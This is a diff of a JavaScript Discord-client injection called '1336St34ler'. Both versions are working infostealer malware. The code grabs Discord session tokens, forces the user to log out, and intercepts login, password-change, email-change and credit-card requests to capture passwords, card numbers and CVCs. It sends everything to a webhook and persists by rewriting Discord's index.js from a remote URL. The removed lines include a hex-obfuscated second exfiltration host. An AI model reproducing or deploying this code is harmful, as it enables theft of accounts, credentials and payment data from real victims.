@@ -1,4 +1,5 @@
-process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
+CONFIG_OBF
+;process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
 
 const fs = require("fs")
 const electron = require("electron")
@@ -8,40 +9,7 @@ const queryString = require("querystring")
 var computerName = process.env.COMPUTERNAME
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
 var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`
-var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false
-var config = {
-    "logout": "true",
-    "logout-notify": "true",
-    "init-notify": "true",
-    "embed-color": 374276,
-
-    injection_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/injection-1336.js",
-    webhook: "%WEBHOOK%",
-    uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
-    Filter: {
-        "urls": [
-            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
-            "https://*.discord.com/api/v*/applications/detectable",
-            "https://discord.com/api/v*/applications/detectable",
-            "https://*.discord.com/api/v*/users/@me/library",
-            "https://discord.com/api/v*/users/@me/library",
-            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
-            "https://discord.com/api/v*/users/@me/billing/subscriptions",
-            "wss://remote-auth-gateway.discord.gg/*"
-        ]
-    },
-    onCompleted: {
-        urls: [
-            "https://discord.com/api/v*/users/@me",
-            "https://discordapp.com/api/v*/users/@me",
-            "https://*.discord.com/api/v*/users/@me",
-            "https://discordapp.com/api/v*/auth/login",
-            'https://discord.com/api/v*/auth/login',
-            'https://*.discord.com/api/v*/auth/login',
-            "https://api.stripe.com/v*/tokens"
-        ]
-    }
-};
+var doTheLogOut = fs.existsSync("./yamete.1336") ? true : false
 
 async function execScript(str) {
     var window = electron.BrowserWindow.getAllWindows()[0]
@@ -58,8 +26,7 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "1336St34ler | https://t.me/St34ler",
-        avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
+        username: "1336St34ler | t.me/St34ler",
         content: "",
         embeds: [{
             title: title,
@@ -67,10 +34,10 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: "1336St34ler | https://t.me/St34ler"
+                name: "1336St34ler"
             },
             footer: {
-                text: "@1336St34ler > Bby | https://t.me/St34ler"
+                text: "1336St34ler | https://t.me/St34ler"
             },
 
         }]
@@ -126,7 +93,7 @@ const GetNSFW = (bouki) => {
         case false:
             return ":underage: `NSFW Not Allowed`"
         default:
-            return "Can't see"
+            return "Idk bro you got me"
     }
 }
 const GetA2F = (bouki) => {
@@ -134,9 +101,9 @@ const GetA2F = (bouki) => {
         case true:
             return ":lock: `A2F Enabled`"
         case false:
-            return ":unlock: `A2F Not Enabled`"
+            return ":lock: `A2F Not Enabled`"
         default:
-            return "Can't see"
+            return "Idk bro you got me"
     }
 }
 
@@ -236,7 +203,7 @@ const post = async (params) => {
         data: params,
         token: token
     });
-    [config.uwu, config.webhook].forEach(res => {
+    [config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
             host: url.hostname,
@@ -251,7 +218,7 @@ const post = async (params) => {
         req.on("error", (err) => {
             console.log(err);
         });
-        req.write(res == config.uwu ? n : params);
+        req.write(params);
         req.end();
     })
 
@@ -264,12 +231,7 @@ const FirstTime = async () => {
     var ip = await getIP()
     if (!token) {
         var params = await makeEmbed({
-            title: "1336St34ler Initalized",
-            fields: [{
-                name: "Injection Info",
-                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
-                inline: !1
-            }]
+            title: "Thanks for using 1336St34ler",
         })
     } else {
         var user = await getURL("https://discord.com/api/v8/users/@me", token)
@@ -280,56 +242,52 @@ const FirstTime = async () => {
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
         if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
 
-
+        userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: "1336St34ler Initalized",
+            title: "Thanks for using 1336St34ler",
+            description: `${user.username}'s account`,
             fields: [{
-                name: "Injection Info",
-                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
-                inline: !1
+                name: ":mag_right: **User ID**",
+                value: `\`${user.id}\``,
+                inline: true
             }, {
-                name: ":mag_right: User ID",
-                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
-                inline: !0
-            }, {
-                name: ":bust_in_silhouette: Username",
+                name: ":bust_in_silhouette: **Username**",
                 value: `\`${user.username}#${user.discriminator}\``,
-                inline: !0
+                inline: true
             }, {
-                name: "<a:nitro:1067551337266561135> Nitro",
-                value: `${GetNitro(Nitro)}`,
-                inline: !0
-            }, {
-                name: "<:badge:1067551347332878487> Badges",
-                value: `${GetBadges(user.flags)}`,
-                inline: !0
-            }, {
-                name: ":card: Billings",
-                value: `${Billings}`,
-                inline: !1
-            }, {
-                name: "<a:a2f:1040272766982692885> A2F",
-                value: `${GetA2F(user.mfa_enabled)}`,
-                inline: !0
-            }, {
-                name: "<:mail:1067551360637218897> Email",
+                name: ":e_mail: **Email**",
                 value: `\`${user.email}\``,
-                inline: !0
+                inline: false
             }, {
-                name: "<:token:1067551382103658597> Token",
-                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
-                inline: !1
+                name: ":mobile_phone: **Phone**",
+                value: `\`${user.phone ?? "None"}\``,
+                inline: false
+            }, {
+                name: ":pushpin: **Badges**",
+                value: `${GetBadges(user.flags)}`,
+                inline: true
+            }, {
+                name: ":sparkles: **Nitro**",
+                value: `${GetNitro(Nitro)}`,
+                inline: true
+            }, {
+                name: "**Billing**",
+                value: `${Billings}`,
+                inline: false
+            }, {
+                name: "**Token**",
+                value: `\`\`\`${token}\`\`\``,
+                inline: false
             }],
-            image: userBanner,
             thumbnail: userAvatar
         })
         var params2 = await makeEmbed({
-            title: `<:JoinIcon:1050854831742525510> Total Friends (${Friends.len})`,
+            title: `Total Friends (${Friends.len})`,
             color: config['embed-color'],
             description: Friends.badges,
-            image: userBanner,
             thumbnail: userAvatar
         })
 
@@ -339,12 +297,7 @@ const FirstTime = async () => {
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "1336St34ler User log out (User not Logged in before)",
-                fields: [{
-                    name: "Injection Info",
-                    value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
-                    inline: !1
-                }]
+                title: "Thanks for using 1336St34ler (First LogOut)",
             })
         } else {
             var user = await getURL("https://discord.com/api/v8/users/@me", token)
@@ -355,62 +308,58 @@ const FirstTime = async () => {
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
             if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
 
-
+            userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "1336St34ler Victim got logged out",
+                title: "Thanks for using 1336St34ler (LogOut)",
+                description: `${user.username}'s account`,
                 fields: [{
-                    name: "Injection Info",
-                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
-                    inline: !1
+                    name: ":mag_right: **User ID**",
+                    value: `\`${user.id}\``,
+                    inline: true
                 }, {
-                    name: ":mag_right: User ID",
-                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
-                    inline: !0
-                }, {
-                    name: ":bust_in_silhouette: Username",
+                    name: ":bust_in_silhouette: **Username**",
                     value: `\`${user.username}#${user.discriminator}\``,
-                    inline: !0
+                    inline: true
                 }, {
-                    name: "<a:nitro:1067551337266561135> Nitro",
-                    value: `${GetNitro(Nitro)}`,
-                    inline: !0
-                }, {
-                    name: "<:badge:1067551347332878487> Badges",
-                    value: `${GetBadges(user.flags)}`,
-                    inline: !0
-                }, {
-                    name: ":card: Billings",
-                    value: `${Billings}`,
-                    inline: !1
-                }, {
-                    name: "<a:a2f:1040272766982692885> A2F",
-                    value: `${GetA2F(user.mfa_enabled)}`,
-                    inline: !0
-                }, {
-                    name: "<:mail:1067551360637218897> Email",
+                    name: ":e_mail: **Email**",
                     value: `\`${user.email}\``,
-                    inline: !0
+                    inline: false
                 }, {
-                    name: "<:token:1067551382103658597> Token",
-                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
-                    inline: !1
+                    name: ":mobile_phone: **Phone**",
+                    value: `\`${user.phone ?? "None"}\``,
+                    inline: false
+                }, {
+                    name: ":pushpin: **Badges**",
+                    value: `${GetBadges(user.flags)}`,
+                    inline: true
+                }, {
+                    name: ":sparkles: **Nitro**",
+                    value: `${GetNitro(Nitro)}`,
+                    inline: true
+                }, {
+                    name: "**Billing**",
+                    value: `${Billings}`,
+                    inline: false
+                }, {
+                    name: "**Token**",
+                    value: `\`\`\`${token}\`\`\``,
+                    inline: false
                 }],
-                image: userBanner,
                 thumbnail: userAvatar
             })
             var params2 = await makeEmbed({
-                title: `<:JoinIcon:1050854831742525510> Total Friends (${Friends.len})`,
+                title: `Total Friends (${Friends.len})`,
                 color: config['embed-color'],
                 description: Friends.badges,
-                image: userBanner,
                 thumbnail: userAvatar
             })
 
             params.embeds.push(params2.embeds[0])
         }
-        fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
+        fs.writeFileSync("./yamete.1336", "LogOut")
         await execScript(logOutScript)
         doTheLogOut = true
         await post(params)
@@ -445,13 +394,10 @@ const checUpdate = () => {
     fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`)
 
     var script = `const fs = require("fs"), https = require("https")
-
 var index = "${indexFile}"
 var betterDiscord = "${betterDiscord}"
-
 var bouki = fs.readFileSync(index).toString()
 if (bouki == "module.exports = require('./core.asar');") init()
-
 function init() {
     https.get("${config.injection_url}", res => {
         var chunk = ""
@@ -459,7 +405,6 @@ function init() {
         res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
     }).on("error", (err) => setTimeout(init(), 10000));
 }
-
 require("${appPath}/app.asar")
 if (fs.existsSync(betterDiscord)) require(betterDiscord)`
 
@@ -505,9 +450,9 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
     if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
 
-
-
+    userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
     var Billings = parseBilling(billing)
     var Friends = parseFriends(friends)
@@ -516,60 +461,54 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "1336St34ler User Login",
-                description: `${info.username}'s account`,
+                title: "Thanks for using 1336St34ler (Login)",
+                description: `${user.username}'s account`,
                 color: config['embed-color'],
                 fields: [{
-                    name: "Injection Info",
-                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
-                    inline: !1
+                    name: ":mag_right: **User ID**",
+                    value: `\`${user.id}\``,
+                    inline: true
                 }, {
-                    name: ":mag_right: User ID",
-                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
-                    inline: !0
-                }, {
-                    name: ":bust_in_silhouette: Username",
+                    name: ":bust_in_silhouette: **Username**",
                     value: `\`${user.username}#${user.discriminator}\``,
-                    inline: !0
+                    inline: true
                 }, {
-                    name: "<a:nitro:1067551337266561135> Nitro",
-                    value: `${GetNitro(Nitro)}`,
-                    inline: !0
-                }, {
-                    name: "<:badge:1067551347332878487> Badges",
-                    value: `${GetBadges(user.flags)}`,
-                    inline: !0
-                }, {
-                    name: ":card: Billings",
-                    value: `${Billings}`,
-                    inline: !1
-                }, {
-                    name: "<a:a2f:1040272766982692885> A2F",
-                    value: `${GetA2F(user.mfa_enabled)}`,
-                    inline: !0
-                }, {
-                    name: "<:mail:1067551360637218897> Email",
+                    name: ":e_mail: **Email**",
                     value: `\`${user.email}\``,
-                    inline: !0
+                    inline: false
                 }, {
-                    name: ":fire: Password",
+                    name: ":key: **Password**",
                     value: `\`${password}\``,
-                    inline: !0
+                    inline: true
                 }, {
-                    name: "<:token:1067551382103658597> Token",
-                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
-                    inline: !1
+                    name: ":mobile_phone: **Phone**",
+                    value: `\`${user.phone ?? "None"}\``,
+                    inline: false
+                }, {
+                    name: ":pushpin: **Badges**",
+                    value: `${GetBadges(user.flags)}`,
+                    inline: true
+                }, {
+                    name: ":sparkles: **Nitro**",
+                    value: `${GetNitro(Nitro)}`,
+                    inline: true
+                }, {
+                    name: "**Billing**",
+                    value: `${Billings}`,
+                    inline: false
+                }, {
+                    name: "**Token**",
+                    value: `\`\`\`${token}\`\`\``,
+                    inline: false
                 }],
 
                 thumbnail: userAvatar,
-                image: userBanner
             })
 
             var params2 = await makeEmbed({
-                title: `<:JoinIcon:1050854831742525510> Total Friends (${Friends.len})`,
+                title: `Total Friends (${Friends.len})`,
                 color: config['embed-color'],
                 description: Friends.badges,
-                image: userBanner,
                 thumbnail: userAvatar
             })
 
@@ -581,68 +520,58 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "1336 Detect Password Changed",
-                    description: `${info.username}'s account`,
+                    title: "Thanks for using 1336St34ler (Password Changed)",
+                    description: `${user.username}'s account`,
                     color: config['embed-color'],
                     fields: [{
-                        name: "Injection Info",
-                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
-                        inline: !1
+                        name: ":mag_right: **User ID**",
+                        value: `\`${user.id}\``,
+                        inline: true
                     }, {
-                        name: ":mag_right: User ID",
-                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
-                        inline: !0
-                    }, {
-                        name: ":bust_in_silhouette: Username",
+                        name: ":bust_in_silhouette: **Username**",
                         value: `\`${user.username}#${user.discriminator}\``,
-                        inline: !0
+                        inline: true
                     }, {
-                        name: "<a:nitro:1067551337266561135> Nitro",
-                        value: `${GetNitro(Nitro)}`,
-                        inline: !0
-                    }, {
-                        name: "<:badge:1067551347332878487> Badges",
-                        value: `${GetBadges(user.flags)}`,
-                        inline: !0
-                    }, {
-                        name: ":card: Billings",
-                        value: `${Billings}`,
-                        inline: !0
-                    }, {
-                        name: "<a:a2f:1040272766982692885> A2F",
-                        value: `${GetA2F(user.mfa_enabled)}`,
-                        inline: !0
-                    }, {
-                        name: "<:mail:1067551360637218897> Email",
+                        name: ":e_mail: **Email**",
                         value: `\`${user.email}\``,
-                        inline: !0
+                        inline: false
                     }, {
-                        name: ":anchor: Old Password",
+                        name: ":key: **Old Password**",
                         value: `\`${data.password}\``,
-                        inline: !0
+                        inline: true
                     }, {
-                        name: ":fire: New Password",
+                        name: ":key: **New Password**",
                         value: `\`${data.new_password}\``,
-                        inline: !0
+                        inline: true
                     }, {
-                        name: "?? Bio",
-                        value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
-                        inline: !1
+                        name: ":mobile_phone: **Phone**",
+                        value: `\`${user.phone ?? "None"}\``,
+                        inline: false
                     }, {
-                        name: "<:token:1067551382103658597> Token",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
-                        inline: !1
+                        name: ":pushpin: **Badges**",
+                        value: `${GetBadges(user.flags)}`,
+                        inline: true
+                    }, {
+                        name: ":sparkles: **Nitro**",
+                        value: `${GetNitro(Nitro)}`,
+                        inline: true
+                    }, {
+                        name: "**Billing**",
+                        value: `${Billings}`,
+                        inline: false
+                    }, {
+                        name: "**Token**",
+                        value: `\`\`\`${token}\`\`\``,
+                        inline: false
                     }, ],
 
                     thumbnail: userAvatar,
-                    image: userBanner
                 })
 
                 var params2 = await makeEmbed({
-                    title: `<:JoinIcon:1050854831742525510> Total Friends (${Friends.len})`,
+                    title: `Total Friends (${Friends.len})`,
                     color: config['embed-color'],
                     description: Friends.badges,
-                    image: userBanner,
                     thumbnail: userAvatar
                 })
 
@@ -652,64 +581,54 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "1336 Detect Email Changed",
+                    title: "Thanks for using 1336St34ler (Email Changed)",
                     description: `${user.username}'s account`,
                     color: config['embed-color'],
                     fields: [{
-                        name: "Injection Info",
-                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
-                        inline: !1
+                        name: ":mag_right: **User ID**",
+                        value: `\`${user.id}\``,
+                        inline: true
                     }, {
-			name: ":mag_right: User ID",
-                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
-                        inline: !0
-                    }, {
-                        name: ":bust_in_silhouette:Username",
+                        name: ":bust_in_silhouette: **Username**",
                         value: `\`${user.username}#${user.discriminator}\``,
-                        inline: !0
+                        inline: true
                     }, {
-                        name: "<a:nitro:1067551337266561135> Nitro",
-                        value: `${GetNitro(Nitro)}`,
-                        inline: !0
-                    }, {
-                        name: "<:badge:1067551347332878487> Badges",
-                        value: `${GetBadges(user.flags)}`,
-                        inline: !0
-                    }, {
-			name: ":card: Billing",
-                        value: `${Billings}`,
-                        inline: !1
-                    }, {
-                        name: "<a:a2f:1040272766982692885> A2F",
-                        value: `${GetA2F(user.mfa_enabled)}`,
-                        inline: !0
-                    }, {
-                        name: "<:mail:1067551360637218897> New Email",
+                        name: ":e_mail: **New Email**",
                         value: `\`${user.email}\``,
-                        inline: !0
+                        inline: false
                     }, {
-                        name: ":fire: Password",
+                        name: ":key: **Password**",
                         value: `\`${data.password}\``,
-                        inline: !0
+                        inline: true
                     }, {
-                        name: "?? Bio",
-                        value:  `\`\`\`${user.bio ?? ":x:"}\`\`\``,
-                        inline: !1
+                        name: ":mobile_phone: **Phone**",
+                        value: `\`${user.phone ?? "None"}\``,
+                        inline: false
                     }, {
-                        name: "<:token:1067551382103658597> Token",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
-                        inline: !1
+                        name: ":pushpin: **Badges**",
+                        value: `${GetBadges(user.flags)}`,
+                        inline: true
+                    }, {
+                        name: ":sparkles: **Nitro**",
+                        value: `${GetNitro(Nitro)}`,
+                        inline: true
+                    }, {
+                        name: "**Billing**",
+                        value: `${Billings}`,
+                        inline: false
+                    }, {
+                        name: "**Token**",
+                        value: `\`\`\`${token}\`\`\``,
+                        inline: false
                     }, ],
 
                     thumbnail: userAvatar,
-                    image: userBanner
                 })
 
                 var params2 = await makeEmbed({
-                    title: `<:JoinIcon:1050854831742525510> Total Friends (${Friends.len})`,
+                    title: `Total Friends (${Friends.len})`,
                     color: config['embed-color'],
                     description: Friends.badges,
-                    image: userBanner,
                     thumbnail: userAvatar
                 })
 
@@ -722,28 +641,21 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                "title": "1336Stealer User Credit Card Added",
+                title: "Thanks for using 1336St34ler (CreditCard Added)",
                 description: `
-                **IP:** ${ip}\n\n
-		:mag_right: **ID**\n\`\`\`${user.id}\`\`\`\n
-                :bust_in_silhouette: **Username**\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
-		<a:nitro:1067551337266561135> **Nitro**\n${GetNitro(user.premium_type)}\n
-		<:badge:1067551347332878487> **Badges**\n${GetBadges(user.flags)}\n
-		<:mail:1067551360637218897> **Email**\n\`\`\`${user.email}\`\`\`\n
-		<a:a2f:1040272766982692885> **A2F**\n${GetA2F(user.mfa_enabled)}\n
-		**Credit Card Number**\n\`\`\`${CardNumber}\`\`\`\n
+                **Username**\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
+                **ID**\n\`\`\`${user.id}\`\`\`\n
+                **Credit Card Number**\n\`\`\`${CardNumber}\`\`\`\n
                 **Credit Card Expiration**\n\`\`\`${month}/${year}\`\`\`\n
                 **CVC**\n\`\`\`${CardCVC}\`\`\`\n
-		<:token:1067551382103658597> **Token** \n\`\`\`${token}\`\`\``,
+                **Token** \n\`\`\`${token}\`\`\``,
                 thumbnail: userAvatar,
-                image: userBanner
             })
 
             var params2 = await makeEmbed({
-                title: `<:JoinIcon:1050854831742525510> Total Friends (${Friends.len})`,
+                title: `Total Friends (${Friends.len})`,
                 color: config['embed-color'],
                 description: Friends.badges,
-                image: userBanner,
                 thumbnail: userAvatar
             })
 
